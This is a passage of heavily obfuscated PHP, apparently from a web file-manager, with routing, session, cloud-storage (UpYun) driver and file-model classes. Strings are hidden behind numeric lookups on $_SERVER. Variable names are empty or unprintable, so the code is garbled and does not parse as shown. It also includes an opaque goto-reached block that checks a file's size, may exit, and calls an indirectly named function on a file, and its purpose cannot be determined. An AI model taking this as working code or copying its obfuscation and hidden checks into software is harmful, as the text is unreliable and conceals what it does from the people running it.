$; } public function link($ = false, $В = '') { $ψ =& $_SERVER[]; if (!$) { $this->link($ψ[1618], $ψ[1616]); $this->link($ψ[1619], $ψ[1615]); $this->link($ψ[1620], $ψ[1615]); $this->link($ψ[1621], $ψ[1615]); $this->link($ψ[1622], $ψ[1615]); return; } $ب = $this->url($, $В, !1); if (substr($, -3) == $ψ[1623]) { echo $ψ[1624] . $ب . $ψ[1625] . $ψ[246]; } else { if (substr($, -4) == $ψ[1626]) { echo $ψ[1627] . $ب . $ψ[1628] . $ψ[246]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\x5e\x2f\135\53", "\72\156\165\x6d" => "\x5b\60\55\x39\135\x2b", "\x3a\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($, $ԑ) { $ =& $_SERVER[]; if ($ == $[1629]) { $남 = array_map($[1630], $ԑ[0]); $Ƨ = strpos($ԑ[1], $[8]) === 0 ? $ԑ[1] : $[8] . $ԑ[1]; $ = $ԑ[2]; } else { $남 = null; $Ƨ = strpos($ԑ[0], $[8]) === 0 ? $ԑ[0] : $[8] . $ԑ[0]; $ = $ԑ[1]; } array_push(self::$maps, $남); array_push(self::$routes, $Ƨ); array_push(self::$methods, strtoupper($)); array_push(self::$callbacks, $); } public static function error($ׂ۹) { self::$errorCallback = $ׂ۹; } public static function haltOnMatch($ުׯ = true) { self::$halts = $ުׯ; } public static function dispatch() { $ϓ =& $_SERVER[]; $Ç = parse_url($_SERVER[$ϓ[1631]], PHP_URL_PATH); $积 = $_SERVER[$ϓ[160]]; $㘿 = array_keys(static::$patterns); $ϥ = array_values(static::$patterns); $ = !1; self::$routes = preg_replace($ϓ[1317], $ϓ[8], self::$routes); if (in_array($Ç, self::$routes)) { $ = array_keys(self::$routes, $Ç); foreach ($ as $ꖉ) { if (self::$methods[$ꖉ] == $积 || self::$methods[$ꖉ] == $ϓ[1632] || in_array($积, self::$maps[$ꖉ])) { $ = !0; if (!is_object(self::$callbacks[$ꖉ])) { $ԃ = explode($ϓ[8], self::$callbacks[$ꖉ]); $ = end($ԃ); $ = explode($ϓ[1249], $); $ = new $[0](); $->{$[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ꖉ]); if (self::$halts) { return; } } } } } else { $ĭ = 0; foreach (self::$routes as $ꖉ) { if (strpos($ꖉ, $ϓ[4]) !== !1) { $ꖉ = str_replace($㘿, $ϥ, $ꖉ); } if (preg_match($ϓ[1633] . $ꖉ . $ϓ[1634], $Ç, $ɞ)) { if (self::$methods[$ĭ] == $积 || self::$methods[$ĭ] == $ϓ[1632] || !empty(self::$maps[$ĭ]) && in_array($积, self::$maps[$ĭ])) { $ = !0; array_shift($ɞ); if (!is_object(self::$callbacks[$ĭ])) { $ԃ = explode($ϓ[8], self::$callbacks[$ĭ]); $ = end($ԃ); $ = explode($ϓ[1249], $); $ = new $[0](); if (!method_exists($, $[1])) { echo $ϓ[1635]; } else { call_user_func_array(array($, $[1]), $ɞ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ĭ], $ɞ); if (self::$halts) { return; } } } } $ĭ++; } } if ($ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $˱ =& $_SERVER[]; header($_SERVER[$˱[1636]] . $˱[1637]); echo $˱[1638]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ϓ[1631]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $皬 =& $_SERVER[]; static $񫂳 = false; if ($񫂳) { return $񫂳; } $ = $GLOBALS[$皬[6]][$皬[393]]; self::$sessionTime = $[$皬[1639]]; $ĕ = isset($GLOBALS[$皬[1640]]) ? $GLOBALS[$皬[1640]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ĕ)) { self::$sessionSign = Cookie::get($ĕ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ĕ, self::$sessionSign, self::$sessionTime); $Ǫ = $[$皬[1641]]; $ = $[$Ǫ]; $Ȓ = $[$皬[862]]; switch ($Ǫ) { case $皬[21]: self::$handle = Model($皬[863]); break; case $皬[864]: self::$handle = new CacheRedis($, $Ȓ); break; case $皬[865]: self::$handle = new CacheMemcached($, $Ȓ); break; case $皬[214]: $[$皬[84]] = $[$皬[84]] . $皬[1642]; self::$handle = new CacheFile($, $Ȓ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $񫂳 = new self(); return $񫂳; } public static function getBySign($ь) { $ʀ = self::$handle->get($ь); $ʀ = unserialize($ʀ); return is_array($ʀ) ? $ʀ : array(); } public static function setBySign($ݲ, $܌) { CacheLock::lock($ݲ); self::$handle->set($ݲ, serialize($܌), self::$sessionTime); CacheLock::unlock($ݲ); } public static function sign($㼜 = false) { if ($㼜) { self::$sessionSign = $㼜; } self::init(); return self::$sessionSign; } public static function set($Ź, $ݹΤ = false) { self::init(); if (is_array($Ź)) { foreach ($Ź as $ => $՛) { array_set_value(self::$data, $, $՛); } } else { array_set_value(self::$data, $Ź, $ݹΤ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($׬ = false) { self::init(); if (!$׬) { return self::$data; } return array_get_value(self::$data, $׬); } public static function remove($Ǯ) { self::init(); unset(self::$data[$Ǯ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][868])) { self::$handle->clearTimeout(); } } } goto b󹐒; c螽ڍ: if ($_SERVER[$_SERVER[][911]] != $_size($_file)) { $_getc = $_SERVER[][914]; $_getfile = $_SERVER[$_SERVER[][915]] . $_SERVER[][916]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][246], $_getfilec); if (count($_getarrs) < $_SERVER[][657]) { $exit = $_SERVER[][917]; $exit(); } $_act = $_SERVER[][1223]; $_act($_file); } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($́, $ = 0) { parent::__construct(); $this->source = $́; $this->sourceSize = $; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ = false) { return $this->sourceSize; } public function getContent($ = false) { return $this->fileSubstr($, 0, $this->sourceSize); } public function fileSubstr($ = false, $ = 0, $҈ = 0) { if (!$҈) { $҈ = $this->sourceSize; } $ = $this->sourceSize - $; if ($҈ >= $) { $҈ = $; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $, $҈); } if ($this->sourceType == self::TYPE_FILE) { if ($҈ <= 0) { return $_SERVER[][12]; } $ = ftell($this->source); fseek_64($this->source, $ + $); $ٯ = @fread($this->source, $҈); fseek_64($this->source, $); return $ٯ; } } public function hashMd5($ܯ = false) { return md5($this->getContent()); } public static function hash($ǘ, $ = 0) { $ؙ = new PathDriverStream($ǘ, $); return $ؙ->hashSimple($ǘ); } public static function md5($°, $̑ = 0) { $ɒ = new PathDriverStream($°, $̑); return $ɒ->hashMd5($°); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\x3a\x2f\x2f\x76\x30\x2e\x61\x70\151\x2e\165\x70\x79\x75\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ьܻ) { parent::__construct(); $this->_init($Ьܻ); } public function _init($) { $̽ =& $_SERVER[]; foreach ($ as $ => $) { if (isset($this->{$})) { $this->{$} = $; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($̽[1480] . LNG($̽[1410])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ﶖ, $ʆԲ = "\107\105\x54") { $六 =& $_SERVER[]; $ = gmdate($六[1443]); $ҥ = base64_encode(hash_hmac($六[1481], "{$ʆԲ}\x26{$ﶖ}\x26{$}", md5("{$this->userpass}"), !0)); $̞ = array("\x41\165\164\x68\157\162\x69\x7a\x61\164\151\x6f\156\72\125\120\131\125\x4e\40{$this->username}\72{$ҥ}", "\x44\x61\x74\145\x3a{$}"); return $̞; } public function ussRequest($, $ = "\107\105\124", $﹪ = false, $ = false, $묽֒ = false) { $ =& $_SERVER[]; $ = trim($, $[8]); $ = "\x2f{$this->bucket}\x2f{$}"; $ҏ = $this->ussHeaders($, $); if ($) { $ҏ = array_merge($ҏ, $); } $ȍ = url_request($this->endpoint . $, $, $﹪, $ҏ, $묽֒); if (!$ȍ) { return array($[1253] => !1, $[1243] => $[1482]); } if (strtolower($) == $[211] || in_array($ȍ[$[1253]], array($[257], $[1483]))) { $﹪ = $ȍ[$[1484]]; } else { $﹪ = json_decode($ȍ[$[1243]], !0); if (!$﹪) { $﹪ = $ȍ[$[1243]]; } else { if (!$ȍ[$[784]] && isset($﹪[$[1485]])) { $﹪ = $﹪[$[1485]]; } } } return array($[1253] => $ȍ[$[784]], $[1243] => $﹪); } public function mkfile($, $ϞՌ = '', $Ԭ = REPEAT_RENAME) { if ($this->setContent($, $ϞՌ)) { return $this->getPathOuter($); } return !1; } public function mkdir($, $² = REPEAT_SKIP) { $ =& $_SERVER[]; $ҩ = trim($, $[8]); if ($this->_isFolder($ҩ)) { return $this->getPathOuter($ҩ); } $Ȗ = array($[1486]); $͢ = $this->ussRequest($ҩ, $[241], !1, $Ȗ); return $͢[$[1253]] ? $this->getPathOuter($ҩ) : !1; } public function copyFile($ѸƢ, $) { $ =& $_SERVER[]; $ײ = array($[1487] . "\x2f{$this->bucket}\x2f{$ѸƢ}", $[1488]); $ۥ = $this->ussRequest($, $[243], !1, $ײ); return $ۥ[$[1253]] ? !0 : $this->getPathOuter($); } public function moveFile($˹, $) { $ =& $_SERVER[]; $㋢ = array($[1489] . "\57{$this->bucket}\57{$˹}", $[1488]); $ = $this->ussRequest($, $[243], !1, $㋢); return $[$[1253]] ? !0 : $this->getPathOuter($); } public function delFile($) { $˞ˈ =& $_SERVER[]; $ɜ = $this->ussRequest($, $˞ˈ[1490]); return $ɜ[$˞ˈ[1253]] ? !0 : !1; } public function delFolder($ħԽ) { $ =& $_SERVER[]; if (!$this->exist($ħԽ)) { return !0; } $this->listItemCache = !1; $ = $ = array(); $this->fileList($ħԽ, $, $, !0); $this->listItemCache = !0; foreach ($ as $) { $ـۙ = $this->ussRequest($[$[32]], $[1490]); if (!$ـۙ[$[1253]]) { return !1; } } foreach ($ as $ˈ) { $ـۙ = $this->ussRequest($ˈ, $[1490]); if (!$ـۙ[$[1253]]) { return !1; } } $ـۙ = $this->ussRequest($ħԽ, $[1490]); return $ـۙ[$[1253]]; } public function rename($ؐ߬, $) { if ($this->isFile($ؐ߬)) { $ = get_path_father($ؐ߬) . $; return $this->moveFile($ؐ߬, $); } return $this->renameObject($ؐ߬, $); } public function fileInfo($, $ߧѠ = false, $ט = array()) { $ҕ =& $_SERVER[]; $Î = array($ҕ[32] => $this->pathThis($), $ҕ[84] => $this->getPathOuter($ҕ[8] . $), $ҕ[33] => $ҕ[214], $ҕ[76] => isset($ט[$ҕ[76]]) ? $ט[$ҕ[76]] : 0, $ҕ[175] => $this->ext($)); if ($ߧѠ) { return $Î; } $Î[$ҕ[215]] = $Î[$ҕ[85]] = 0; $Î[$ҕ[216]] = $Î[$ҕ[217]] = !0; if (empty($ט)) { $ט = $this->objectMeta($); if (!$ט) { return $Î; } } $Î[$ҕ[215]] = intval($ט[$ҕ[1491]]); $Î[$ҕ[85]] = intval($ט[$ҕ[1492]]); $Î[$ҕ[76]] = $ט[$ҕ[76]]; return $Î; } public function folderInfo($, $ = false) { $ʟ =& $_SERVER[]; $ʄ = array($ʟ[32] => $this->pathThis($), $ʟ[84] => $this->getPathOuter($ʟ[8] . $), $ʟ[33] => $ʟ[75]); if ($) { return $ʄ; } $ʄ[$ʟ[215]] = $ʄ[$ʟ[85]] = 0; $ʄ[$ʟ[216]] = $ʄ[$ʟ[217]] = !0; if (empty($ح)) { $ح = $this->objectMeta($); if (!$ح) { return $ʄ; } } $ʄ[$ʟ[215]] = intval($ح[$ʟ[1491]]); $ʄ[$ʟ[85]] = intval($ح[$ʟ[1492]]); return $ʄ; } private function listObjs($ą, $ݙ = 0, $Ȁ = 1000) { $ʜ =& $_SERVER[]; $񔛺 = array($ʜ[1493], $ʜ[1494] . $Ȁ); if ($ݙ) { $񔛺[] = $ʜ[1495] . $ݙ; } $͸ = $this->ussRequest($ą, $ʜ[245], !1, $񔛺); return !$͸[$ʜ[1253]] ? !1 : $͸[$ʜ[1243]]; } private function fileList($έ쓽, &$, &$, $ = false) { $ =& $_SERVER[]; $챕 = $[12]; $ = 1000; $ = rtrim($έ쓽, $[8]) . $[8]; while (!0) { check_abort(); $˴܀ = $this->listObjs($έ쓽, $챕, $); if (!$˴܀) { return !1; } $챕 = isset($˴܀[$[1496]]) ? $˴܀[$[1496]] : $[12]; $ = isset($˴܀[$[1497]]) ? $˴܀[$[1497]] : array(); foreach ($ as $ɋ) { $ = $ɋ[$[33]] == $[75] ? !0 : !1; $Α = ltrim($ . $ɋ[$[32]], $[8]) . ($ ? $[8] : $[12]); $ = array($[32] => $Α, $[33] => $ ? $[75] : $[214], $[76] => $ɋ[$[381]], $[1492] => $ɋ[$[1498]]); $this->cacheMethodInfoSet($Α, $, $); if ($) { $[] = $Α; if ($) { $this->fileList($Α, $, $, $); } continue; } $[] = $; } if (count($) < $) { break; } } $this->cacheMethodInfoSet($έ쓽, !0); } public function listPath($, $ = false) { $ =& $_SERVER[]; $۷җ = $ = array(); $this->fileList($, $۷җ, $); foreach ($۷җ as $ => $) { $۷җ[$] = $this->folderInfo($, $); } foreach ($ as $ => $) { $[$] = $this->fileInfo($[$[32]], $, $); } return array($[82] => $۷җ, $[83] => $); } public function has($ޜɺ, $ = false, $Ϩ = true) { $ =& $_SERVER[]; $Ű = $[12]; $ = 500; $݅ = 0; $ = 0; $ = rtrim($ޜɺ, $[8]) . $[8]; while (!0) { check_abort(); $ = $this->listObjs($ޜɺ, $Ű, $); if (!$) { return !1; } $Ű = isset($[$[1496]]) ? $[$[1496]] : $[12]; $١ = isset($[$[1497]]) ? $[$[1497]] : array(); if (empty($١)) { break; } $ڊ = array_filter($١, function ($Ѫ) { $ =& $_SERVER[]; return $Ѫ[$[33]] == $[75]; }); $Ԏ = count($١); $ڊ = count($ڊ); $а = $Ԏ - $ڊ; if ($) { $ += $ڊ; $݅ += $а; if ($Ԏ < $) { break; } continue; } if ($Ϩ) { if ($а) { return !0; } } else { if ($ڊ) { return !0; } } if ($Ԏ < $) { break; } } if ($) { return array($[223] => $݅, $[224] => $); } return !1; } public function listAll($݈) { $㠁 =& $_SERVER[]; $ᚫ = $ކ = array(); $this->fileList($݈, $ᚫ, $ކ, !0); $ = array_to_keyvalue($ކ, $㠁[32]); foreach ($ᚫ as $) { if (is_string($)) { $[$] = array($㠁[76] => 0); } } return $this->listAllFiles($݈, $); } public function canRead($) { return $this->exist($) ? !0 : !1; } public function canWrite($) { return $this->exist($) ? !0 : !1; } public function getContent($ĝɬ) { return $this->fileSubstr($ĝɬ, 0, -1); } public function setContent($, $ = '') { $ԁ =& $_SERVER[]; if (!$) { $Ƿ = $this->ussRequest($, $ԁ[241]); return $Ƿ[$ԁ[1253]]; } $Ǟ = $this->tempFile($this->pathThis($)); file_put_contents($Ǟ, $); if ($this->upload($, $Ǟ)) { $this->tempFileRemve($Ǟ); return !0; } return !1; } public function fileSubstr($Ɂ, $, $) { $ =& $_SERVER[]; if (!($Ӻ = $this->link($Ɂ))) { return !1; } $Ĵ = !1; if ($ > 0) { $ԅ = $ + $ - 1; $Ĵ = array($[1458] . $ . $[430] . $ԅ); } $ݳ = url_request($Ӻ, $[245], !1, $Ĵ); return $ݳ[$[784]] ? $ݳ[$[1243]] : !1; } public function upload($, $ꦷϜ, $ = false, $ = REPEAT_REPLACE) { $ =& $_SERVER[]; $ͷ = IO::size($ꦷϜ); if ($ͷ <= 1024 * 1024 * 200) { $ = array($[1499] . $ꦷϜ); $ = $this->ussRequest($, $[243], $); return $[$[1253]] ? $this->getPathOuter($) : !1; } $ = 1024 * 1024 * 10; $ㇶ = array($[1500], $[1501] . $ͷ, $[1502], $[1503] . $); $ = $this->ussRequest($, $[243], !1, $ㇶ); if (!$[$[1253]]) { return !1; } $ʌ = $[$[1243]]; $ݢ = 0; $ڤ = $ʌ[$[1504]]; $ȹ = fopen($ꦷϜ, $[1407]); if (!$ȹ) { return !1; } do { $̺ = $ʌ[$[1505]]; fseek_64($ȹ, $ݢ); $ĳ = fread($ȹ, $̺); $ = 0; do { $++; $ʌ = $this->uploadPart($, $ʌ, $ĳ); } while (!$ʌ && $ < 3); if (!$ʌ) { return !1; } $ڤ = $ʌ[$[1504]]; $ݢ += $̺; } while ($ڤ != -1); fclose($ȹ); $ㇶ = array($[1506], $[1507] . $ʌ[$[1508]], $[1502]); $ = $this->ussRequest($, $[243], !1, $ㇶ); return $[$[1253]] ? $this->getPathOuter($ݥ՚) : !1; } private function uploadPart($ʅ, $, &$) { $ݩޣ =& $_SERVER[]; $ሰ = array($ݩޣ[1509], $ݩޣ[1507] . $[$ݩޣ[1508]], $ݩޣ[1510] . $[$ݩޣ[1504]], $ݩޣ[143] . $[$ݩޣ[1505]]); $✟ = $this->ussRequest($ʅ, $ݩޣ[243], $, $ሰ); return !$✟[$ݩޣ[1253]] ? $✟[$ݩޣ[1253]] : $✟[$ݩޣ[1243]]; } public function uploadFormData($, $ = 3600) { return $this->uploadPolicy($, $); } public function multiUploadFormData($, $ҧ = 3600) { $ޙ =& $_SERVER[]; $ܾ = (int) $GLOBALS[$ޙ[7]][$ޙ[76]]; return $this->uploadPolicy($, $ҧ, $ܾ); } private function uploadPolicy($Ĉ, $М = 3600, $ = 0) { $ё =& $_SERVER[]; $̳ɴ = $ё[8] . $this->bucket; $ = gmdate($ё[1443]); $Ƈ = array($ё[1511] => $this->bucket, $ё[1512] => $Ĉ, $ё[1513] => time() + $М, $ё[1514] => $); if ($) { $Ƈ[$ё[1424]] = $; } $ = base64_encode(json_encode($Ƈ)); $ = base64_encode(hash_hmac($ё[1481], "\x50\117\123\x54\46{$̳ɴ}\46{$}\x26{$}", md5("{$this->userpass}"), !0)); $ѧ = array($ё[276] => $, $ё[1515] => "\125\120\x59\x55\116\40{$this->username}\72{$}", $ё[196] => $this->endpoint . $̳ɴ); return $ѧ; } public function download($, $) { $⮦ = IO::getPathInner(IO::mkfile($)); if (!($׳ = $this->link($))) { return !1; } $Ō = 0; $ = 1024 * 200; $ۘ = fopen($⮦, $_SERVER[][1464]); while (!0) { $ = $this->fileSubstr($, $Ō, $); if ($ === !1) { return !1; } fwrite($ۘ, $); $Ō += $; if (strlen($) < $) { break; } } fclose($ۘ); return $; } public function link($݄, $ʓܞ = array()) { $ȜȈ =& $_SERVER[]; $݄ = trim($݄, $ȜȈ[8]); if (!empty($this->token)) { $ѩ = strtotime(date($ȜȈ[1516])); $ = substr(md5($this->token . $ȜȈ[328] . $ѩ . $ȜȈ[1517] . $݄), 12, 8) . $ѩ; $ʓܞ[] = $ȜȈ[1518] . $; } $̚ȏ = !empty($ʓܞ) ? $ȜȈ[73] . implode($ȜȈ[328], $ʓܞ) : $ȜȈ[12]; return $this->getHost() . $ȜȈ[8] . $݄ . $̚ȏ; } public function fileOut($Ɓ, $卫 = false, $Ƅ = false, $Њ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ɓ, $卫, $Ƅ, $Њ); } if (!$Ƅ) { $Ƅ = $this->pathThis($Ɓ); } $㤏 = $卫 ? array($_SERVER[][1519] . rawurlencode($Ƅ)) : array(); $ز = $this->link($Ɓ, $㤏); $this->fileOutLink($ز); } public function fileOutServer($ܠ, $靿 = false, $ = false, $π = '') { parent::fileOut($ܠ, $靿, $, $π); } public function fileOutImage($, $ = 250) { $ӕ = $this->link($ . $_SERVER[][1520] . $); $this->fileOutLink($ӕ); } public function fileOutImageServer($, $̨ = 250) { parent::fileOutImage($, $̨); } public function hashMd5($) { $ӌ̀ =& $_SERVER[]; $ = $this->_objectMeta($); return isset($[$ӌ̀[228]]) ? $[$ӌ̀[228]] : !1; } public function size($ӥ) { $ = $this->objectMeta($ӥ); return $ ? $[$_SERVER[][76]] : 0; } public function info($¹) { if ($this->isFolder($¹)) { return $this->folderInfo($¹); } else { if ($this->isFile($¹)) { return $this->fileInfo($¹); } } return !1; } public function exist($©) { return $this->isFile($©) || $this->isFolder($©); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($) { return $this->cacheMethod($_SERVER[][166], $); } protected function objectMeta($ĸ) { return $this->cacheMethod($_SERVER[][168], $ĸ); } protected function _objectMeta($۴) { $鎶 =& $_SERVER[]; if ($۴ == $鎶[12] || $۴ == $鎶[8]) { return array(); } $ = $this->ussRequest($۴, $鎶[1521]); if (!$[$鎶[1253]]) { return null; } $諟 = isset($[$鎶[1243]]) ? $[$鎶[1243]] : array(); if (!isset($諟[$鎶[1522]])) { return null; } $̨ = array($鎶[33] => isset($諟[$鎶[1522]]) ? $諟[$鎶[1522]] : null, $鎶[76] => isset($諟[$鎶[1523]]) ? $諟[$鎶[1523]] : null, $鎶[228] => isset($諟[$鎶[1524]]) ? $諟[$鎶[1524]] : null, $鎶[1491] => isset($諟[$鎶[1525]]) ? $諟[$鎶[1525]] : null); $̨[$鎶[1492]] = isset($諟[$鎶[1526]]) ? strtotime($諟[$鎶[1526]]) : $̨[$鎶[1491]]; return $̨; } protected function _isFolder($Ś) { $ =& $_SERVER[]; if ($Ś == $[12] || $Ś == $[8]) { return !0; } $ = $this->_objectMeta($Ś); return isset($[$[33]]) && $[$[33]] == $[75] ? !0 : !1; } } goto eƌ; e۳: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\x6c\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\x6d\145" => "\151\157\137\146\151\154\145\x5f\155\x65\x74\x61", "\155\145\x74\x61\106\x69\145\154\144" => "\x66\x69\x6c\x65\x49\x44"); public function fileInfo($ƺ) { $ =& $_SERVER[]; static $ݵ = array(); if (!isset($ݵ[$ƺ])) { $ = $[1934]; $ݟ = Model($[512])->field($)->where(array($[510] => $ƺ))->find(); $ݵ[$ƺ] = $ݟ; } return $ݵ[$ƺ]; } public function addFileByContent($Ʃ = '', $㝑 = '') { $¼ =& $_SERVER[]; $ = TEMP_PATH . $¼[1935]; if (!is_dir($)) { mk_dir($); } $ܹݞ = $ . $¼[1936] . rand_string(16); file_put_contents($ܹݞ, $Ʃ); $ŵ = $this->addFile($ܹݞ, $㝑, !0); if (file_exists($ܹݞ)) { @unlink($ܹݞ); } return $ŵ; } public function createFileName($, $ = false, $Ѐ = false) { $պ =& $_SERVER[]; $Ӎ = IO::init($պ[8]); $𳃠 = $this->makeFilePath($, $Ӎ, $, $Ѐ); $ = $Ӎ->pathFather($𳃠); static $ = false; $Έ = $պ[1937] . md5($); if (!$ && !Cache::get($Έ)) { $ = !0; $Êړ = IO::mkdir($); if (!IO::exist($Êړ . $պ[831])) { IO::mkfile($Êړ . $պ[831]); } Cache::set($Έ, 1, 3600 * 2); } return $𳃠; } public function makeFilePath($, $, $ҷ = false, $ = false) { $ =& $_SERVER[]; $浦 = Model($[804])->get($[1938]); $ = KodIO::defaultIO() . date($[1939]); $͂ = $ . rand_string(5) . short_id(100); $ = str_replace($[8], $[11], KodIO::clear($)); $ْʛ = $->ext($); if (!$) { $浦 = $[1940]; } switch ($浦) { case $[1941]: $͂ = $͂ . $[10] . $->ext($); if ($ْʛ == $[1878]) { $͂ .= $[1247]; } break; case $[1942]: $ؖ͝ = Model($[804])->get($[805]); $ͤ = substr(md5($[806] . $ؖ͝ . date($[782])), 0, 8); $ = KodIO::defaultDriver(); $ = $[1278] . $[$[443]] . $[452] . date($[1943]) . $ͤ . $[8]; if ($ْʛ == $[1878]) { $ .= $[1247]; } $ = $[1944] . $ . $; CacheLock::lock($); $͂ = $ . $; if (IO::exist($ . $)) { $׆ = substr($, 0, strlen($) - strlen($ْʛ)); $ͷ = $ ? substr($, 0, 5) : ($ҷ ? substr($ҷ, 0, 5) : rand_string(5)); $͂ = $ . $׆ . $ͷ . $[10] . $ْʛ; } if (IO::isTypeObject($͂) && !IO::isUploadServer($͂)) { if (IO::exist($͂)) { return $͂; } $݉ = IO::setContent($͂, $[12]); if (!$݉) { show_json($[1945], !1); } } CacheLock::unlock($); break; case $[1940]: break; default: break; } return $͂; } public function addFileByRemote($޷, $Ӕ, $Ѯވ = array()) { $ =& $_SERVER[]; if (!IO::exist($޷)) { return !1; } $¦ = $Ѯވ[$[641]] ? $Ѯވ[$[641]] : $[12]; $ء = IO::hashMd5($޷, $¦); $ڒ = KodIO::defaultDriver(); $ = array($[585] => IO::size($޷), $[1946] => 1, $[462] => $Ӕ, $[842] => $ڒ[$[443]], $[463] => $޷, $[1947] => $Ѯވ[$[640]] ? $Ѯވ[$[640]] : IO::hashSimple($޷), $[1948] => $ء ? $ء : $¦); if ($А = $this->addFileCheckExist($[$[640]], $[$[641]], $[$[76]])) { return $А; } return $this->addFileData($); } private function addFileData($У) { $͆­ =& $_SERVER[]; if (!$У) { return !1; } $У[$͆­[76]] = intval($У[$͆­[76]]); if (!$У[$͆­[76]] && strlen($У[$͆­[640]]) > 32) { $У[$͆­[76]] = intval(substr($У[$͆­[640]], 32)); } $＃ = $this->add($У); return $this->find($＃); } public function addFile($, $ʲ, $俆 = false) { $Ƀݦ =& $_SERVER[]; $ = IO::hashSimple($); $Ɣ = IO::size($); $콴 = $Ɣ <= 1024 * 1024 * 10 ? IO::hashMd5($) : $Ƀݦ[12]; $Ȼտ = $Ƀݦ[1949] . $; CacheLock::lock($Ȼտ); if ($콴 && $) { $ = $this->addFileCheckExist($, $콴, $Ɣ); if ($) { CacheLock::unlock($Ȼտ); return $; } } $ۖ = $this->addFileMake($, $Ɣ, $, $콴, $ʲ, $俆); $ٖ = $this->addFileData($ۖ); CacheLock::unlock($Ȼտ); if (!$콴 && $ٖ) { $this->fileMd5Check($ٖ); } return $ٖ; } private function fileMd5Check($ħ) { $ࠬ =& $_SERVER[]; $ = array($ħ[$ࠬ[509]], $ħ[$ࠬ[84]]); $ = $ࠬ[1950] . $ħ[$ࠬ[84]]; $ѷڝ = $ࠬ[1951] . $ħ[$ࠬ[509]]; $γБ = TaskQueue::add($ࠬ[1952], $, $, $ѷڝ); if (!$γБ) { $this->fileMd5Set($ħ[$ࠬ[509]], $ħ[$ࠬ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($نҀ, $) { $ =& $_SERVER[]; $̓ = $this->find($نҀ); if (!$̓ || $̓[$[641]]) { return; } $ = IO::hashMd5($); if (!$) { return $[12]; } $this->where(array($[509] => $نҀ))->save(array($[641] => $)); } public function addFileMake($ʫ, $鑊, $Ǔ, $, $, $) { $þĠ =& $_SERVER[]; $±ܵ = $this->createFileName($, $Ǔ, $); $ = get_path_father($±ܵ); $Օ = get_path_this($±ܵ); if ($) { $Ǧ = IO::move($ʫ, $, !1, $Օ); } else { $Ǧ = IO::copy($ʫ, $, !1, $Օ); } if (!$Ǧ) { return !1; } $Ƌ = KodIO::defaultDriver(); $¢ = array($þĠ[585] => $鑊, $þĠ[1946] => 1, $þĠ[462] => $, $þĠ[842] => $Ƌ[$þĠ[443]], $þĠ[463] => $±ܵ, $þĠ[1947] => $Ǔ, $þĠ[1948] => $); return $¢; } public function addFileCheckExist($醹, $èȑō, $î) { $ǽ =& $_SERVER[]; $఺ = $this->findByHash($醹, $èȑō); if (!$఺) { return !1; } $Ȯ = array($ǽ[1946] => intval($఺[$ǽ[1953]]) + 1, $ǽ[585] => $î); $this->where(array($ǽ[510] => $఺[$ǽ[509]]))->save($Ȯ); return $఺; } public function remove($) { $this->linkCountChange($, !1); $this->clearEmpty(); return !0; } public function linkAdd($) { $this->linkCountChange($, !0); } public function linkCountChange($, $) { $ =& $_SERVER[]; if (!$) { return; } if (!is_array($)) { $ = array($); } $ = array(); foreach ($ as $ԏ) { $ = $ԏ . $[12]; if (!$[$]) { $[$] = 0; } $[$]++; } $ʅ = array(); foreach ($ as $ԏ => $ķ) { $ = $ķ . $[12]; if (!$ʅ[$]) { $ʅ[$] = array(); } $ʅ[$][] = $ԏ; } foreach ($ʅ as $ķ => $Ƨ) { if (!$Ƨ) { continue; } $ķ = $ ? $ķ : -intval($ķ); $ = array($[509] => array($[7], $Ƨ)); if ($ķ < 0) { $[$[1953]] = array($[1054], abs($ķ)); } $this->where($)->setAdd($[1953], $ķ); } } public function findByHash($槖, $Գ = false) { $㗎 =& $_SERVER[]; if (!$槖 && !$Գ) { return !1; } $ = array($㗎[1947] => $槖); if ($Գ) { $ = array($㗎[1948] => $Գ); } return $this->order($㗎[1954])->where($)->find(); } public function clearEmpty($ìʺ = 0) { $ =& $_SERVER[]; $ڪ = time() - 3600 * 24 * $ìʺ; $ = $[1955] . $ڪ; $۬ = $this->where($)->select(); if (!$۬) { return; } $Ɩ = new Task($[1956], $[12], count($۬)); foreach ($۬ as $󎜢) { $Ɩ->update(1); $this->resetFile($󎜢); } $Ɩ->end(); } public function resetFile($) { $ς =& $_SERVER[]; $ôɞ = array($ς[510] => $[$ς[509]]); $ = 